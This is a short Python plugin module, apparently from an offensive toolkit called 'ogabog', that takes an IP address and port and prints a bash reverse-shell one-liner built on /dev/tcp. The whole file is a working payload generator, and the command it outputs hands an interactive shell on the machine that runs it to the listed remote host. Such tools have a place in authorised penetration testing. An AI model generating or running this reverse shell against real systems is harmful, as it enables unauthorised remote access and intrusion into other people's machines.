from ogabog.cores import plugin


class ReverseShell(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--ip",
            help="IP address"
        )
        self.add_args(
            "--port",
            help="Port address"
        )
        self.opts.description = "Generate reverse shell using bash"
        self.shell = """bash -i >& /dev/tcp/{}/{} 0>&1"""

    def show_shell(self, args):
        print(self.shell.format(args.ip, args.port))
